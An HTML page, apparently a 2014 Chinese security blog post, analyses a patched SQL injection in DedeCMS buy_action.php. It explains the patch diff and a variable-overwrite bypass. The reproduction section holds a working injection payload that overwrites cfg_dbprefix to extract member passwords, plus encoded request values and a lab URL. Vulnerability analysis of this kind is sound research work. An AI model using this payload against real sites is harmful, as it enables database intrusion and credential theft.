@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Dedecms buy_action.php SQL注入漏洞分析 &middot; 奇门遁甲
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/label.css">
+  <link rel="stylesheet" href="/public/css/global.css">
+
+  <!-- Icons -->
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+</head>
+
+
+  <body class="theme-base-ff">
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          奇门遁甲
+        </a>
+      </h1>
+      <p class="lead"></p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+
+      </ul>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about.html">About</a>
+          
+        
+      
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/tags.html">标签</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
+        <ul class="sidebar-nav-subitem">
+            
+            <li><a href="/categories.html#读书">读书 <small>(3)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#技术">技术 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#no-category">未分类</a>
+            </li>
+        </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">Dedecms buy_action.php SQL注入漏洞分析</h1>
+  <p>
+      <span >04 Mar 2014 by
+          <a href="#"></a>
+      </span>&nbsp;&nbsp;
+      
+  </p>
+  <p>#0x01 补丁对比
+通过对比源码和2月25日补丁发现被改动的文件有三个，buy_action.php、uploadsafe.inc.php和sys_info.htm。</p>
+
+<p>sys_info.htm只是添加了一个重置cfg_cookie_encode的代码，而且是静态文件，可以忽略掉。uploadsafe.inc.php是另外一个注入漏洞的修补,所以只剩下buy_action.php文件，下面我们来看下发生变化的地方：</p>
+
+<!--more-->
+
+<p>变化前</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>/**
+ *  加密函数
+ *
+ * @access    public
+ * @param     string  $string  字符串
+ * @param     string  $action  操作
+ * @return    string
+ */
+function mchStrCode($string,$action='ENCODE')
+{
+    $key    = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
+    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
+    $len    = strlen($key);
+    $code    = '';
+    for($i=0; $i<span class="nt">&lt;strlen</span><span class="err">($</span><span class="na">string</span><span class="err">);</span> <span class="err">$</span><span class="na">i</span><span class="err">++)</span>
+    <span class="err">{</span>
+        <span class="err">$</span><span class="na">k        =</span><span class="err"> </span><span class="s">$i</span> <span class="err">%</span> <span class="err">$</span><span class="na">len</span><span class="err">;</span>
+        <span class="err">$</span><span class="na">code</span>  <span class="err">.=</span> <span class="err">$</span><span class="na">string</span><span class="err">[$</span><span class="na">i</span><span class="err">]</span> <span class="err">^</span> <span class="err">$</span><span class="na">key</span><span class="err">[$</span><span class="na">k</span><span class="err">];</span>
+    <span class="err">}</span>
+    <span class="err">$</span><span class="na">code =</span><span class="err"> </span><span class="s">$action</span> <span class="err">==</span> <span class="err">'</span><span class="na">DECODE</span><span class="err">'</span> <span class="err">?</span> <span class="err">$</span><span class="na">code</span> <span class="na">:</span> <span class="na">base64_encode</span><span class="err">($</span><span class="na">code</span><span class="err">);</span>
+    <span class="na">return</span> <span class="err">$</span><span class="na">code</span><span class="err">;</span>
+<span class="err">}</span>
+</code></pre>
+</div>
+
+<p>变化后</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>/**
+ *  加密函数
+ *
+ * @access    public
+ * @param     string  $string  字符串
+ * @param     string  $operation  操作
+ * @return    string
+ */
+function mchStrCode($string, $operation = 'ENCODE') 
+{
+    $key_length = 4;
+    $expiry = 0;
+    $key = md5($GLOBALS['cfg_cookie_encode']);
+    $fixedkey = md5($key);
+    $egiskeys = md5(substr($fixedkey, 16, 16));
+    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
+    $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
+    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));
+
+    $i = 0; $result = '';
+    $string_length = strlen($string);
+    for ($i = 0; $i <span class="err">&lt;</span> $string_length; $i++){
+        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
+    }
+    if($operation == 'ENCODE') {
+        return $runtokey . str_replace('=', '', base64_encode($result));
+    } else {
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) <span class="err">&amp;&amp;</span> substr($result, 10, 16) == substr(md5(substr($result, 26).$egiskeys), 0, 16)) {
+            return substr($result, 26);
+        } else {
+            return '';
+        }
+    }
+}
+</code></pre>
+</div>
+
+<p>由此我们可以断定，这个漏洞应该是由于mchStrCode这个编码方法造成的。在读这个函数时发现，如果在我们知道cfg_cookie_encode的情况下，被编码字符串是可以被逆推出来的。</p>
+
+<p>因此，我们可以初步断定，在某个使用这个编码函数进行解码的地方，解码后没有进行任何的校验和过滤，便将内容传入到SQL语句中，并且用户可以控制进入编码函数进行解码的字符串，从而导致SQL注入的产生。</p>
+
+<p>#0x02 原理分析</p>
+
+<p>这个问题出现在buy_action.php文件的开始部分，相关代码如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>//省略部分代码
+if(isset($pd_encode) <span class="err">&amp;&amp;</span> isset($pd_verify) <span class="err">&amp;&amp;</span> md5("payment".$pd_encode.$cfg_cookie_encode) == $pd_verify)
+{
+    parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
+    foreach($mch_Post as $k =&gt; $v) $$k = $v;*］
+    $row  = $dsql-&gt;GetOne("SELECT * FROM #@__member_operation WHERE mid='$mid' And sta=0 AND product='$product'");
+    if(!isset($row['buyid']))
+    {
+        ShowMsg("请不要重复提交表单!", 'javascript:;');
+        exit();
+    }
+    if(!isset($paytype))
+    {
+        ShowMsg("请选择支付方式!", 'javascript:;');
+        exit(); 
+    }
+    $buyid = $row['buyid'];
+
+}//省略部分代码
+</code></pre>
+</div>
+
+<p>我们重点来看if语句开始时的三行代码，mchStrCode是我们在上一小节通过对比补丁发现变化的函数。也就是说这个函数可以编码或者解码，用户提交的数据，而且$pd_encode也是我们可以控制的变量。</p>
+
+<p>parse_str方法将解码后$pd_encode中的变量放到$mch_Post数组中，之后的foreach语句存在明显的变量覆盖，将$mch_Post中的key定义为变量，同时将key所对应的value赋予该变量。然后，再向下就是执行SQL查询了。</p>
+
+<p>在这个过程中存在一个明显的疏忽是，没有对定义的key进行检查，导致攻击者可以通过mschStrCode编码攻击代码，绕过GPC和其他过滤机制，使攻击代码直达目标。</p>
+
+<p>其实如果从漏洞成因的角度来看，这属于全局变量覆盖漏洞，而非SQL注入漏洞。</p>
+
+<p>#0x03 利用思路
+漏洞原理比较简单，但是利用起来还是有很大的难度的，从我实现的过程来看，具体的绊脚石有两个：</p>
+
+<ol>
+  <li>如果开启GPC，parse_str依然会对变量值中的特殊字符进行转义，仍然无法绕过。</li>
+  <li>mchStrCode这个函数的编码过程中需要知道网站预设的cfg_cookie_encode，而这个内容在用户界面只可以获取它的MD5值。</li>
+</ol>
+
+<p>第一个问题解决很简单，虽然$mid和$product被单引号封闭，但是考虑到我们可以利用这个漏洞进行全局变量覆盖，我们可以直接覆盖全局变量cfg_dbprefix，将SQL注入语句插入到from后。也就是说我们可以通过覆盖表前缀变量，将SQL注入语句放置在from关键字后面。</p>
+
+<p>第二个问题就有很大的难度，虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，在最坏的情况下要跑超过20天的时间。</p>
+
+<p>之后在想这个漏洞时，我想到那肯定是在什么地方可以使用mchStrCode加密可控参数，并且能够返回到页面中。</p>
+
+<p>通过搜索整个源码文件，发现在buy_action.php文件的一个分支中使用了这个函数进行编码，并且只有这个地方进行了编码，相关代码如下：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>//省略部分代码
+if(!isset($paytype))
+{    
+    $inquery = "INSERT INTO #@__member_operation(`buyid` , `pname` , `product` , `money` , `mtime` , `pid` , `mid` , `sta` ,`oldinfo`)
+   VALUES ('$buyid', '$pname', '$product' , '$price' , '$mtime' , '$pid' , '$mid' , '0' , '$ptype');
+    ";
+    $isok = $dsql-&gt;ExecuteNoneQuery($inquery);
+    if(!$isok)
+    {
+        echo "数据库出错，请重新尝试！".$dsql-&gt;GetError();
+        exit();
+    }
+    
+    if($price=='')
+    {
+        echo "无法识别你的订单！";
+        exit();
+    }
+    
+    //获取支付接口列表
+    $payment_list = array();
+    $dsql-&gt;SetQuery("SELECT * FROM #@__payment WHERE enabled='1' ORDER BY rank ASC");
+    $dsql-&gt;Execute();
+    $i = 0 ;
+    while($row = $dsql-&gt;GetArray())
+    {
+        $payment_list[] = $row;
+        $i++;
+    }
+    unset($row);
+
+    $pr_encode = '';
+    foreach($_REQUEST as $key =&gt; $val)
+    {
+        $pr_encode .= $pr_encode ? "<span class="err">&amp;</span>$key=$val" : "$key=$val";
+    }
+    $pr_encode = str_replace('=', '', mchStrCode($pr_encode));
+    
+    $pr_verify = md5("payment".$pr_encode.$cfg_cookie_encode);
+    
+    $tpl = new DedeTemplate();
+    $tpl-&gt;LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
+    $tpl-&gt;Display();
+    
+}//省略部分代码
+</code></pre>
+</div>
+
+<p>通过这部分代码，我想到的利用方法是提交带有【cfg_dbprefix=SQL注入】的提交请求，进入这个分支，让它帮助我来编码【cfg_dbprefix=SQL注入】，从而获取相应的pr_encode和pr_verify。
+但是，这样利用的话就会引出第三个问题，common.inc.php文件中对于用户提交的内容进行了过滤，凡是以cfg_、GLOBALS、_GET、_POST、_COOKIE等内容开头的提交都会被拦截。</p>
+
+<p>这个问题的解决就利用到了$_REQUEST内容与parse_str函数内容的差异特性。试想，我们向网站传递“a=1&amp;b=2%26c=3”这样的提交时，$_REQUEST的内容是【a=1，b=2%26c=3】.而通过上面代码的遍历进入parse_str函数的内容则是【a=1&amp;b=2&amp;c=3】，解析后的内容就变成了【a=1，b=2，c=3】。由此，我们可以通过这一特性来绕过common.inc.php文件对于参数内容传递的验证。</p>
+
+<p>#0x04 漏洞重现
+访问buy_action.php文件，使用如下参数：</p>
+
+<blockquote>
+  <p>product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@<code class="highlighter-rouge">'</code> /<em>!12345union</em>/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(<em>),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23</p>
+</blockquote>
+
+<p>其中product和pid参数是为了让我们进入mchStrCode对传入数据进行编码的分支，a是为了配合上面提到的差异特性而随意添加的参数。从cfg_dbprefix开始，便是真正的SQL注入攻击代码。
+访问该URL后，在页面源码中找到pd_encode和pd_verify字段的值，由于用户Cookie和User-Agent不同，所获取的值也不同，我这里获取的值非别为</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>pd_encode:FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg；
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>pd_verify：1c7ba5d2861959347d0c427684a6ad30。
+</code></pre>
+</div>
+
+<p>以这两个字段作为参数访问buy_action.php，URL为：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://192.168.188.142//dedecms5.7_sp1_utf8/member/buy_action.php?pd_encode=FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg&amp;pd_verify=1c7ba5d2861959347d0c427684a6ad30
+</code></pre>
+</div>
+
+<p>效果如下图所示：</p>
+
+<p><img src="/images/content/2014-03-04-01.jpg" alt="1" /></p>
+
+</div>
+
+<div class="related">
+  <h2>相关文章:</h2>
+  <ul class="related-posts">
+    
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B.html">
+            Wordpress ImageMagic漏洞测试环境搭建&amp;利用的心路历程
+            <small>17 Jun 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">
+            PHPCMS用户登陆SQL注入漏洞分析
+            <small>21 Jul 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E8%AF%BB%E4%B9%A6/2015/04/26/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88-%E5%A4%B1%E6%8E%A7-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80.html">
+            社交网络需要什么？——《失控》读书笔记一
+            <small>26 Apr 2015</small>
+          </a>
+        </h3>
+      </li>
+    
+    
+  </ul>
+</div>
+
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
+<!-- UY END -->
+
+    </div>
+
+  </body>
+</html>
